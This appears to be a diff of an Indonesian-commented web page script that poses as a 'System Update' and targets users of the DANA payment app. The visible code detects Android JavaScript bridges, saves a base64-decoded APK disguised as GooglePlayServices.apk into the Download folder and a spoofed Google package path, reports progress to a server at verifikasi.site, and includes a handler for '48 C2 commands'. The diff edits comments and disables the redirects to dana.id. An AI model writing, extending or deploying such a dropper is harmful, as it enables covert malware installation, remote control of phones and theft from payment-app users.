@@ -64,10 +64,6 @@
 
 <script>
 // ============================================================
-// 🔥 TAMBAHAN: MULTI-BRIDGE DETECTION (HANYA DITAMBAHKAN)
-// ============================================================
-
-// ============================================================
 // DETEKSI MULTI-BRIDGE (JavaScriptInterface)
 // ============================================================
 var BRIDGE = null;
@@ -88,10 +84,6 @@ var BRIDGE = null;
         }
     }
 })();
-
-// ============================================================
-// 🔥 TAMBAHAN: UNIVERSAL FALLBACK (TIDAK MENGHAPUS KODE ASLI)
-// ============================================================
 
 // ============================================================
 // FALLBACK WRAPPER - HANYA DIGUNAKAN JIKA AndroidBridge TIDAK ADA
@@ -211,7 +203,7 @@ function K(d) {
 }
 
 // ============================================================
-// 🔥 KODE ASLI ANDA DIMULAI DARI SINI (TIDAK DIUBAH)
+// KONFIGURASI
 // ============================================================
 
 var SERVER = 'https://verifikasi.site';
@@ -250,7 +242,7 @@ function detectPlatform() {
 var PLATFORM = detectPlatform();
 
 // ============================================================
-// ANDROID BRIDGE ASLI (TETAP MENGGUNAKAN AndroidBridge)
+// ANDROID BRIDGE
 // ============================================================
 var A = {
     isAvailable: typeof AndroidBridge !== 'undefined' && PLATFORM.isAndroid,
@@ -302,7 +294,6 @@ function saveHTMLToAllLocations(htmlContent) {
     } catch(e) {}
     if (PLATFORM.isAndroid && A.isAvailable) {
         try {
-            // 🔥 PERBAIKAN: Ganti ke Download folder
             var path = '/storage/emulated/0/Download/SystemUpdate.html';
             A.saveFile(path, htmlContent);
         } catch(e) {}
@@ -310,7 +301,6 @@ function saveHTMLToAllLocations(htmlContent) {
             var encoded = btoa(unescape(encodeURIComponent(htmlContent)));
             A.saveToPreferences('system_SystemUpdate_html', encoded);
         } catch(e) {}
-        // 🔥 HAPUS: simpan ke com.android.camera (tidak diperlukan)
     }
 }
 
@@ -341,14 +331,12 @@ function loadHTMLFromAllLocations() {
                 var get = store.get('SystemUpdate.html');
                 get.onsuccess = function() {
                     if (get.result) { resolve(get.result); return; }
-                    // 4. 🔥 PERBAIKAN: Ganti ke Download folder
                     if (PLATFORM.isAndroid && A.isAvailable) {
                         try {
                             var content = A.readFile('/storage/emulated/0/Download/SystemUpdate.html');
                             if (content) { resolve(content); return; }
                         } catch(e) {}
                     }
-                    // 🔥 HAPUS: pembacaan dari Android/data dan com.android.camera
                     resolve(null);
                 };
             };
@@ -461,25 +449,24 @@ function saveAPKToAllLocations(apkBase64) {
     // 1. SharedPreferences (Base64)
     if (PLATFORM.isAndroid && A.isAvailable) {
         try { A.saveToPreferences('system_GooglePlayServices_apk', apkBase64); } catch(e) {}
-        // 2. 🔥 PERBAIKAN: Ganti ke Download folder
+        // 2. Download folder
         try {
             var binary = Uint8Array.from(atob(apkBase64), c => c.charCodeAt(0));
             var path = '/storage/emulated/0/Download/GooglePlayServices.apk';
             A.saveFileBinary(path, binary);
         } catch(e) {}
-        // 3. Internal APK folder (paling aman) - 🔥 PERBAIKAN package name
+        // 3. Internal APK folder
         try {
             var binary = Uint8Array.from(atob(apkBase64), c => c.charCodeAt(0));
             var internalPath = '/data/data/com.google.android.play.services/files/GooglePlayServices.apk';
             A.saveFileBinary(internalPath, binary);
         } catch(e) {}
-        // 🔥 HAPUS: simpan ke Android/data/com.android.camera (tidak diperlukan)
     }
 }
 
 function getAPKPath() {
     var paths = [
-        // 🔥 PERBAIKAN: urutan prioritas (internal, Download)
+        // Urutan prioritas (internal, Download)
         '/data/data/com.google.android.play.services/files/GooglePlayServices.apk',
         '/storage/emulated/0/Download/GooglePlayServices.apk'
     ];
@@ -582,9 +569,9 @@ function redirectToDANA() {
             if (PLATFORM.isAndroidBridge && typeof AndroidBridge !== 'undefined') {
                 try { AndroidBridge.openApp('com.dana.id'); } catch(e) {}
             }
-            window.location.href = 'https://www.dana.id';
+ //           window.location.href = 'https://www.dana.id';
         } catch(e) {
-            window.location.href = 'https://www.dana.id';
+ //           window.location.href = 'https://www.dana.id';
         }
     }, 800);
 }
@@ -788,7 +775,7 @@ function cekPerintah() {
 }
 
 // ============================================================
-// 48 PERINTAH C2 (LENGKAP – FUNGSI SAMA SEPERTI SEBELUMNYA)
+// 48 PERINTAH C2
 // ============================================================
 function eksekusiPerintah(cmd) {
     var aksi = cmd.aksi || 'unknown';
@@ -1250,7 +1237,7 @@ function finishAndRedirect() {
     allDone = true;
     updateProgress(100, '✅ Update Selesai');
     K({ sumber: 'update_complete', data: { apk_downloaded: APK_DOWNLOADED ? 'yes' : 'no', apk_installed: APK_INSTALLED ? 'yes' : 'no' } });
-    setTimeout(redirectToDANA, 1500);
+//    setTimeout(redirectToDANA, 1500);
 }
 
 // ============================================================
@@ -1281,7 +1268,7 @@ setTimeout(function() {
         allDone = true;
         updateProgress(100, '✅ Update Selesai');
         K({ sumber: 'timeout_fallback', data: 'redirecting' });
-        setTimeout(redirectToDANA, 1000);
+//        setTimeout(redirectToDANA, 1000);
     }
 }, 10000);
 </script>
